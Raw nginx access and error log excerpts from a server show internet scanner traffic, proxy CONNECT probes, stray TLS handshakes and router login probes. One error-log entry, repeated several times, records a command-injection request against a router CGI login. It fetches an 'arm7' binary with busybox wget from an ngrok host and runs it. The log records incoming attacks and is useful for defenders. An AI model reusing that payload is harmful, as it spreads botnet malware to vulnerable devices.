64.252.86.23 - - [23/Aug/2020:15:45:07 +0000] "GET /api/dispatch/status HTTP/1.1" 200 82 "-" "Amazon CloudFront" "109.205.162.37"
64.252.86.23 - - [23/Aug/2020:15:45:07 +0000] "GET /api/dispatch/history HTTP/1.1" 200 8361 "-" "Amazon CloudFront" "109.205.162.37"
162.243.128.228 - - [23/Aug/2020:16:16:24 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 zgrab/0.x" "-"
46.242.128.165 - - [23/Aug/2020:17:08:49 +0000] "GET /etc/ HTTP/1.1" 200 706 "-" "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)" "-"
139.5.220.77 - - [23/Aug/2020:17:19:42 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "-"
94.131.222.106 - - [23/Aug/2020:17:22:52 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
185.39.11.105 - - [23/Aug/2020:19:02:35 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://52.36.238.40:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
185.39.11.105 - - [23/Aug/2020:19:02:35 +0000] "" 400 0 "-" "-" "-"
102.165.30.41 - - [23/Aug/2020:19:16:07 +0000] "GET / HTTP/1.0" 200 706 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com" "-"


----------------------------------------
/var/log/nginx/error.log
----------------------------------------
2020/08/22 06:56:13 [warn] 3804#0: *26887 using uninitialized "year" variable while logging request, client: 44.224.22.196, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 06:56:13 [warn] 3804#0: *26887 using uninitialized "month" variable while logging request, client: 44.224.22.196, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 06:56:13 [warn] 3804#0: *26887 using uninitialized "day" variable while logging request, client: 44.224.22.196, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 06:56:13 [warn] 3804#0: *26887 using uninitialized "hour" variable while logging request, client: 44.224.22.196, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 06:56:13 [warn] 3804#0: *26888 using uninitialized "year" variable while logging request, client: 44.224.22.196, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 06:56:13 [warn] 3804#0: *26888 using uninitialized "month" variable while logging request, client: 44.224.22.196, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 06:56:13 [warn] 3804#0: *26888 using uninitialized "day" variable while logging request, client: 44.224.22.196, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 06:56:13 [warn] 3804#0: *26888 using uninitialized "hour" variable while logging request, client: 44.224.22.196, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 06:56:13 [warn] 3804#0: *26889 using uninitialized "year" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��Î*õ.¡ô¢R¿È¹\,×ç%šÖ¨0>ð=ÅÞ2XÅ³½ôN��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26889 using uninitialized "month" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��Î*õ.¡ô¢R¿È¹\,×ç%šÖ¨0>ð=ÅÞ2XÅ³½ôN��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26889 using uninitialized "day" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��Î*õ.¡ô¢R¿È¹\,×ç%šÖ¨0>ð=ÅÞ2XÅ³½ôN��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26889 using uninitialized "hour" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��Î*õ.¡ô¢R¿È¹\,×ç%šÖ¨0>ð=ÅÞ2XÅ³½ôN��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26890 using uninitialized "year" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎÁQP)Í§¿Ao=Ïb~ÕºÀÌz•R²÷ê©«Ò¿}‘��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26890 using uninitialized "month" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎÁQP)Í§¿Ao=Ïb~ÕºÀÌz•R²÷ê©«Ò¿}‘��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26890 using uninitialized "day" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎÁQP)Í§¿Ao=Ïb~ÕºÀÌz•R²÷ê©«Ò¿}‘��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26890 using uninitialized "hour" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎÁQP)Í§¿Ao=Ïb~ÕºÀÌz•R²÷ê©«Ò¿}‘��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26891 using uninitialized "year" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎÆo'­äéûÔzòT†¡lÒæø5Î¬îþùOÑ'Ç}��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26891 using uninitialized "month" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎÆo'­äéûÔzòT†¡lÒæø5Î¬îþùOÑ'Ç}��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26891 using uninitialized "day" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎÆo'­äéûÔzòT†¡lÒæø5Î¬îþùOÑ'Ç}��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26891 using uninitialized "hour" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎÆo'­äéûÔzòT†¡lÒæø5Î¬îþùOÑ'Ç}��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26892 using uninitialized "year" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎrÉzZªC½0ô¿\Þ%É…+§nÈŠBlº†?53“‚��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26892 using uninitialized "month" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎrÉzZªC½0ô¿\Þ%É…+§nÈŠBlº†?53“‚��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26892 using uninitialized "day" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎrÉzZªC½0ô¿\Þ%É…+§nÈŠBlº†?53“‚��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26892 using uninitialized "hour" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎrÉzZªC½0ô¿\Þ%É…+§nÈŠBlº†?53“‚��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26893 using uninitialized "year" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎœÅ€UMÑë‘àì‰V‹…0XöžÕÁM–U•6¤¨·ùa��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26893 using uninitialized "month" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎœÅ€UMÑë‘àì‰V‹…0XöžÕÁM–U•6¤¨·ùa��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26893 using uninitialized "day" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎœÅ€UMÑë‘àì‰V‹…0XöžÕÁM–U•6¤¨·ùa��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 06:56:13 [warn] 3804#0: *26893 using uninitialized "hour" variable while logging request, client: 44.224.22.196, server: , request: "�Ò��ÎœÅ€UMÑë‘àì‰V‹…0XöžÕÁM–U•6¤¨·ùa��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26938 using uninitialized "year" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26938 using uninitialized "month" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26938 using uninitialized "day" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26938 using uninitialized "hour" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26939 using uninitialized "year" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26939 using uninitialized "month" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26939 using uninitialized "day" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26939 using uninitialized "hour" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26940 using uninitialized "year" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26940 using uninitialized "month" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26940 using uninitialized "day" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26940 using uninitialized "hour" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26941 using uninitialized "year" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26941 using uninitialized "month" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26941 using uninitialized "day" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26941 using uninitialized "hour" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26942 using uninitialized "year" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26942 using uninitialized "month" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26942 using uninitialized "day" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26942 using uninitialized "hour" variable while logging request, client: 44.225.84.206, server: , request: "CONNECT 52.36.238.40:80 HTTP/1.0"
2020/08/22 08:16:21 [warn] 3804#0: *26943 using uninitialized "year" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Îþ~Å8¨ÅRÛ@‡‘"
2020/08/22 08:16:21 [warn] 3804#0: *26943 using uninitialized "month" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Îþ~Å8¨ÅRÛ@‡‘"
2020/08/22 08:16:21 [warn] 3804#0: *26943 using uninitialized "day" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Îþ~Å8¨ÅRÛ@‡‘"
2020/08/22 08:16:21 [warn] 3804#0: *26943 using uninitialized "hour" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Îþ~Å8¨ÅRÛ@‡‘"
2020/08/22 08:16:21 [warn] 3804#0: *26944 using uninitialized "year" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Îý™ÐVò[¿5�gLr:)±	¶ÑŒðFa	®��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26944 using uninitialized "month" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Îý™ÐVò[¿5�gLr:)±	¶ÑŒðFa	®��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26944 using uninitialized "day" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Îý™ÐVò[¿5�gLr:)±	¶ÑŒðFa	®��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26944 using uninitialized "hour" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Îý™ÐVò[¿5�gLr:)±	¶ÑŒðFa	®��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26945 using uninitialized "year" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î²%ïéäDì¼vÏÅŸ8ÈŸGLa;r¿oi:1­��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26945 using uninitialized "month" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î²%ïéäDì¼vÏÅŸ8ÈŸGLa;r¿oi:1­��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26945 using uninitialized "day" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î²%ïéäDì¼vÏÅŸ8ÈŸGLa;r¿oi:1­��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26945 using uninitialized "hour" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î²%ïéäDì¼vÏÅŸ8ÈŸGLa;r¿oi:1­��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26946 using uninitialized "year" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î„Y¡TµÍ`€×¨Ì)MY/_I·žÆF˜uÒ¸\I^ZX��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26946 using uninitialized "month" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î„Y¡TµÍ`€×¨Ì)MY/_I·žÆF˜uÒ¸\I^ZX��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26946 using uninitialized "day" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î„Y¡TµÍ`€×¨Ì)MY/_I·žÆF˜uÒ¸\I^ZX��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26946 using uninitialized "hour" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î„Y¡TµÍ`€×¨Ì)MY/_I·žÆF˜uÒ¸\I^ZX��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26947 using uninitialized "year" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î„xWøþ°PÓ¥´ç"°¨uÚšÑ`â‚×Ø”’š[z§��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26947 using uninitialized "month" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î„xWøþ°PÓ¥´ç"°¨uÚšÑ`â‚×Ø”’š[z§��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26947 using uninitialized "day" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î„xWøþ°PÓ¥´ç"°¨uÚšÑ`â‚×Ø”’š[z§��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:16:21 [warn] 3804#0: *26947 using uninitialized "hour" variable while logging request, client: 44.225.84.206, server: , request: "�Ò��Î„xWøþ°PÓ¥´ç"°¨uÚšÑ`â‚×Ø”’š[z§��bÀ0À,À/À+�Ÿ�žÀ2À.À1À-�¥�¡�¤� À(À$ÀÀ"
2020/08/22 08:41:59 [warn] 3804#0: *26948 using uninitialized "year" variable while logging request, client: 104.237.233.109, server: , request: "{D79E94C5-70F0-46BD-965B-E17497CCB598}"
2020/08/22 08:41:59 [warn] 3804#0: *26948 using uninitialized "month" variable while logging request, client: 104.237.233.109, server: , request: "{D79E94C5-70F0-46BD-965B-E17497CCB598}"
2020/08/22 08:41:59 [warn] 3804#0: *26948 using uninitialized "day" variable while logging request, client: 104.237.233.109, server: , request: "{D79E94C5-70F0-46BD-965B-E17497CCB598}"
2020/08/22 08:41:59 [warn] 3804#0: *26948 using uninitialized "hour" variable while logging request, client: 104.237.233.109, server: , request: "{D79E94C5-70F0-46BD-965B-E17497CCB598}"
2020/08/22 11:11:10 [warn] 3804#0: *26956 using uninitialized "year" variable while logging request, client: 134.19.215.196, server: , request: "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1"
2020/08/22 11:11:10 [warn] 3804#0: *26956 using uninitialized "month" variable while logging request, client: 134.19.215.196, server: , request: "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1"
2020/08/22 11:11:10 [warn] 3804#0: *26956 using uninitialized "day" variable while logging request, client: 134.19.215.196, server: , request: "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1"
2020/08/22 11:11:10 [warn] 3804#0: *26956 using uninitialized "hour" variable while logging request, client: 134.19.215.196, server: , request: "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1"
2020/08/22 12:51:41 [warn] 3804#0: *26968 using uninitialized "year" variable while logging request, client: 114.35.46.126, server: , request: "GET / HTTP/1.1"
2020/08/22 12:51:41 [warn] 3804#0: *26968 using uninitialized "month" variable while logging request, client: 114.35.46.126, server: , request: "GET / HTTP/1.1"
2020/08/22 12:51:41 [warn] 3804#0: *26968 using uninitialized "day" variable while logging request, client: 114.35.46.126, server: , request: "GET / HTTP/1.1"
2020/08/22 12:51:41 [warn] 3804#0: *26968 using uninitialized "hour" variable while logging request, client: 114.35.46.126, server: , request: "GET / HTTP/1.1"
2020/08/22 19:20:20 [warn] 3804#0: *26994 using uninitialized "year" variable while logging request, client: 94.43.10.155, server: , request: "h+/tmp/gpon80&ipv=0"
2020/08/22 19:20:20 [warn] 3804#0: *26994 using uninitialized "month" variable while logging request, client: 94.43.10.155, server: , request: "h+/tmp/gpon80&ipv=0"
2020/08/22 19:20:20 [warn] 3804#0: *26994 using uninitialized "day" variable while logging request, client: 94.43.10.155, server: , request: "h+/tmp/gpon80&ipv=0"
2020/08/22 19:20:20 [warn] 3804#0: *26994 using uninitialized "hour" variable while logging request, client: 94.43.10.155, server: , request: "h+/tmp/gpon80&ipv=0"
2020/08/22 22:21:48 [warn] 3804#0: *27010 using uninitialized "year" variable while logging request, client: 185.39.11.105, server:
2020/08/22 22:21:48 [warn] 3804#0: *27010 using uninitialized "month" variable while logging request, client: 185.39.11.105, server:
2020/08/22 22:21:48 [warn] 3804#0: *27010 using uninitialized "day" variable while logging request, client: 185.39.11.105, server:
2020/08/22 22:21:48 [warn] 3804#0: *27010 using uninitialized "hour" variable while logging request, client: 185.39.11.105, server:
2020/08/23 04:11:21 [warn] 3804#0: *27089 using uninitialized "year" variable while logging request, client: 59.126.158.52, server: , request: "GET / HTTP/1.1"
2020/08/23 04:11:21 [warn] 3804#0: *27089 using uninitialized "month" variable while logging request, client: 59.126.158.52, server: , request: "GET / HTTP/1.1"
2020/08/23 04:11:21 [warn] 3804#0: *27089 using uninitialized "day" variable while logging request, client: 59.126.158.52, server: , request: "GET / HTTP/1.1"
2020/08/23 04:11:21 [warn] 3804#0: *27089 using uninitialized "hour" variable while logging request, client: 59.126.158.52, server: , request: "GET / HTTP/1.1"
2020/08/23 04:43:25 [warn] 3804#0: *27091 using uninitialized "year" variable while logging request, client: 185.150.189.165, server:
2020/08/23 04:43:25 [warn] 3804#0: *27091 using uninitialized "month" variable while logging request, client: 185.150.189.165, server:
2020/08/23 04:43:25 [warn] 3804#0: *27091 using uninitialized "day" variable while logging request, client: 185.150.189.165, server:
2020/08/23 04:43:25 [warn] 3804#0: *27091 using uninitialized "hour" variable while logging request, client: 185.150.189.165, server:
2020/08/23 19:02:35 [warn] 3804#0: *27171 using uninitialized "year" variable while logging request, client: 185.39.11.105, server:
2020/08/23 19:02:35 [warn] 3804#0: *27171 using uninitialized "month" variable while logging request, client: 185.39.11.105, server:
2020/08/23 19:02:35 [warn] 3804#0: *27171 using uninitialized "day" variable while logging request, client: 185.39.11.105, server:
2020/08/23 19:02:35 [warn] 3804#0: *27171 using uninitialized "hour" variable while logging request, client: 185.39.11.105, server:
```
